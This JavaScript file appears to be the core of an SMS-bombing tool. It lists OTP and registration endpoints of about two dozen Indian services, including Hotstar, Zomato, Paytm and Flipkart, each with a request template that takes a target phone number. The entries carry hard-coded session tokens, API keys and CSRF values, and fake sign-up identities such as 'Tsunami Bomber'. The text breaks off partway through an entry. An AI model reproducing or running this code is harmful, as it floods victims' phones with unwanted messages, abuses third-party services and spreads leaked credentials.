const axios = require('axios');

// ============================================================
// ðŸ”¥ ALL SMS ENDPOINTS (Extracted from bash script)
// ============================================================
const ENDPOINTS = [
  // Hotstar
  {
    method: 'PUT',
    url: 'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
    headers: {
      'Host': 'api.hotstar.com',
      'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc',
      'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'content-type': 'application/json',
      'x-hs-platform': 'PCTV',
      'x-country-code': 'IN',
      'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
      'hotstarauth': 'st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
      'x-hs-appversion': '5.0.40',
      'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
      'accept': '*/*',
      'origin': 'https://www.hotstar.com',
      'referer': 'https://www.hotstar.com/in/subscribe/sign-in'
    },
    data: (number) => ({
      phone_number: number,
      country_prefix: '91'
    })
  },
  // AltBalaji
  {
    method: 'POST',
    url: 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
    headers: {
      'Host': 'api.cloud.altbalaji.com',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'X-API-KEY': 'MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE',
      'Content-Type': 'application/json',
      'Origin': 'https://www.altbalaji.com'
    },
    data: (number) => ({
      phone_number: number,
      country_code: '91',
      platform: 'web',
      exp: 1601043289127
    })
  },
  // Voot
  {
    method: 'POST',
    url: 'https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser',
    headers: {
      'Host': 'us-central1-vootdev.cloudfunctions.net',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://www.voot.com'
    },
    data: (number) => ({
      type: 'mobile',
      mobile: number,
      countryCode: '+91'
    })
  },
  // SonyLIV
  {
    method: 'POST',
    url: 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP',
    headers: {
      'Host': 'apiv2.sonyliv.com',
      'device_id': '5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120',
      'security_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc',
      'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'content-type': 'application/json',
      'session_id': 'cc86326a51504133bacd3ce4f796e1cf-1600956156256',
      'x-via-device': 'true',
      'app_version': '3.1.20',
      'origin': 'https://www.sonyliv.com'
    },
    data: (number) => ({
      channelPartnerID: 'MSMIND',
      mobileNumber: number,
      country: 'IN',
      timestamp: '2020-09-24T14:03:03.505Z'
    })
  },
  // Medplus
  {
    method: 'POST',
    url: 'https://mobile.medplusindia.com/mobilemvc/profile/register.mbl',
    headers: {
      'Host': 'mobile.medplusindia.com',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://www.medplusmart.com'
    },
    data: (number) => `recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber=${number}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false`
  },
  // Apollo
  {
    method: 'POST',
    url: 'https://webapi.apollo247.com/',
    headers: {
      'Host': 'webapi.apollo247.com',
      'Accept': '*/*',
      'Authorization': 'Bearer 3d1833da7020e0602165529446587434',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://www.apollo247.com'
    },
    data: (number) => ({
      operationName: 'Login',
      variables: {
        mobileNumber: `+91${number}`,
        loginType: 'PATIENT'
      },
      query: `query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n`
    })
  },
  // Netmeds
  {
    method: 'GET',
    url: (number) => `https://m.netmeds.com/mst/rest/v1/id/details/${number}`,
    headers: {
      'Host': 'm.netmeds.com',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36'
    }
  },
  // GetInstaCash
  {
    method: 'POST',
    url: 'https://getinstacash.in/sell/getData.php',
    headers: {
      'Host': 'getinstacash.in',
      'Accept': '*/*',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://getinstacash.in'
    },
    data: (number) => `type=sendOTP&mobile=${number}`
  },
  // FBB
  {
    method: 'POST',
    url: 'https://www.fbbonline.in/customer/account/GenerateOtp',
    headers: {
      'Host': 'www.fbbonline.in',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://www.fbbonline.in'
    },
    data: (number) => `YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D=${number}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=`
  },
  // Grofers
  {
    method: 'POST',
    url: 'https://grofers.com/v2/accounts/',
    headers: {
      'Host': 'grofers.com',
      'device_id': 'a11f656b-422e-4617-953b-c350d517467d',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'auth_key': '57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13',
      'app_client': 'consumer_web',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://grofers.com'
    },
    data: (number) => `user_phone=${number}`
  },
  // Snapdeal
  {
    method: 'POST',
    url: 'https://m.snapdeal.com/signupCompleteAjax',
    headers: {
      'Host': 'm.snapdeal.com',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://m.snapdeal.com'
    },
    data: (number) => `j_password=null&j_mobilenumber=${number}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy`
  },
  // Zomato
  {
    method: 'POST',
    url: 'https://www.zomato.com/webroutes/auth/login',
    headers: {
      'Host': 'www.zomato.com',
      'x-zomato-csrft': 'a6b0c09972b2bdd30c9c1b6552caee5d',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://www.zomato.com'
    },
    data: (number) => ({
      country_id: 1,
      phone: number,
      verification_type: 'sms',
      method: 'phone'
    })
  },
  // Cuemath
  {
    method: 'POST',
    url: 'https://www.cuemath.com/api/v4/parents/',
    headers: {
      'Host': 'www.cuemath.com',
      'Content-Type': 'application/JSON',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://www.cuemath.com'
    },
    data: (number) => ({
      intl_mobile: { phone: '' },
      phone: number,
      email: 'nsbd@dn.djs',
      full_name: 'hdhdhdg',
      place_id: 'ChIJYYhT3gl3AjoRUDlkL1i5oIk',
      timezone: 'Asia/Calcutta',
      detail_source: 'CMO_2020',
      form_fields: 'full_name,phone,email,place_id'
    })
  },
  // Dream11
  {
    method: 'POST',
    url: 'https://www.dream11.com/graphql/mutation/pwa/register',
    headers: {
      'Host': 'www.dream11.com',
      'Accept': '*/*',
      'device': 'pwa',
      'x-csrf': 'fb1f1947-4547-392d-9a28-a9de30d9e766',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://www.dream11.com'
    },
    data: (number) => ({
      query: `mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}`,
      variables: {
        email: 'tsunami@gmail.com',
        mobileNumber: number,
        password: 'tsunami@123astronomia'
      }
    })
  },
  // Doubtnut
  {
    method: 'POST',
    url: 'https://doubtnut.com/api/v1/user/login',
    headers: {
      'Host': 'doubtnut.com',
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://doubtnut.com'
    },
    data: (number) => `phone=${number}`
  },
  // Vedantu
  {
    method: 'POST',
    url: 'https://user.vedantu.com/user/preLoginVerification',
    headers: {
      'Host': 'user.vedantu.com',
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://www.vedantu.com'
    },
    data: (number) => ({
      email: null,
      phoneCode: '+91',
      phoneNumber: number,
      ver: '11.345'
    })
  },
  // Unacademy
  {
    method: 'POST',
    url: 'https://unacademy.com/api/v3/user/user_check/',
    headers: {
      'Host': 'unacademy.com',
      'Accept': '*/*',
      'Authorization': 'Bearer undefined',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://unacademy.com'
    },
    data: (number) => ({
      phone: number,
      country_code: 'IN',
      otp_type: 1,
      email: '',
      send_otp: true,
      is_un_teach_user: false
    })
  },
  // Byjus
  {
    method: 'POST',
    url: 'https://bcas-prod.byjusweb.com/api/send-otp',
    headers: {
      'Host': 'bcas-prod.byjusweb.com',
      'Accept': '*/*',
      'Origin': 'https://byjus.com',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Referer': 'https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE'
    },
    data: (number) => `phoneNumber=${number}&page=free-trial-classes`
  },
  // Redbus
  {
    method: 'GET',
    url: (number) => `https://m.redbus.in/api/getOtp?number=${number}&cc=91&whatsAppOpted=undefined`,
    headers: {
      'Host': 'm.redbus.in',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Referer': 'https://m.redbus.in/preregister'
    }
  },
  // Careers360
  {
    method: 'POST',
    url: 'https://www.careers360.com/ajax/no-cache/user/otp-send',
    headers: {
      'Host': 'www.careers360.com',
      'Accept': '*/*',
      'X-CSRFToken': '9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://www.careers360.com'
    },
    data: (number) => `mobile_number=${number}&method=call&uid=12692588`
  },
  // Coolwinks
  {
    method: 'GET',
    url: (number) => `https://api.coolwinks.com/api/accounts/is_already_registered/?username=${number}`,
    headers: {
      'Host': 'api.coolwinks.com',
      'Accept': '*/*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://www.coolwinks.com'
    }
  },
  // Cansell
  {
    method: 'POST',
    url: 'https://webapi.cansell.in/api/User/SignUp',
    headers: {
      'Host': 'webapi.cansell.in',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://m.cansell.in'
    },
    data: (number) => ({
      name: 'Uwusjsj',
      surname: 'wjeshs',
      email: 'hsjs@gmail.com',
      phone: number,
      password: 'eeeeee'
    })
  },
  // Gaana / Times Internet
  {
    method: 'POST',
    url: 'https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile',
    headers: {
      'appVersion': '8.9.0',
      'CONTENT_TYPE': 'application/json',
      'channel': 'gaana.com',
      'tgid': 'j9qcq0z2ur4llq2a58qqmag2',
      'sdkVersion': '1.0',
      'appVersionCode': '933',
      'deviceId': 'j9qcq0z2ur4llq2a58qqmag2',
      'platform': 'android',
      'sdkVersionCode': '1',
      'Content-Type': 'application/json; charset=utf-8',
      'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)',
      'Host': 'jsso1.indiatimes.com'
    },
    data: (number) => ({ mobile: `+91-${number}` })
  },
  // Flipkart (complex JSON)
  {
    method: 'POST',
    url: 'https://1.rome.api.flipkart.com/1/action/view',
    headers: {
      'Host': '1.rome.api.flipkart.com',
      'x-user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'content-type': 'application/json',
      'Referer': 'https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT'
    },
    data: (number) => ({
      actionRequestContext: {
        type: 'LOGIN_IDENTITY_VERIFY',
        loginIdPrefix: '+91',
        loginId: number,
        clientQueryParamMap: {
          ret: '/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135',
          entryPage: 'HOMEPAGE_HEADER_ACCOUNT'
        },
        loginType: 'MOBILE',
        verificationType: 'OTP',
        screenName: 'LOGIN_V4_MOBILE',
        sourceContext: 'DEFAULT'
      }
    })
  },
  // Ullu
  {
    method: 'POST',
    url: (number) => `https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber=${number}`,
    headers: {
      'Host': 'ullu.app',
      'content-length': '0',
      'accept': 'application/json, text/plain, */*',
      'origin': 'https://ullu.app',
      'user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'referer': 'https://ullu.app/'
    }
  },
  // Paytm
  {
    method: 'POST',
    url: 'https://accounts.paytm.com/v2/api/register',
    headers: {
      'Host': 'accounts.paytm.com',
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://accounts.paytm.com',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/json',
      'Referer': 'https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code'
    },
    data: (number) => ({
      email: '',
      mobile: number,
      loginPassword: 'Pura@1090',
      csrfToken: 'f7ea628c-91a2-5f14-82ca-6f7eee295b1d',
      redirectUri: 'https://paytm.com/v1/api/authresponse',
      clientId: 'paytm-web-secure',
      scope: 'paytm',
      state: '',
      responseType: 'code',
      theme: 'mp-html5',
      dob_agreement: true
    })
  },
  // Ogonn
  {
    method: 'POST',
    url: 'https://ogonn.in/otp',
    headers: {
      'Host': 'ogonn.in',
      'Accept
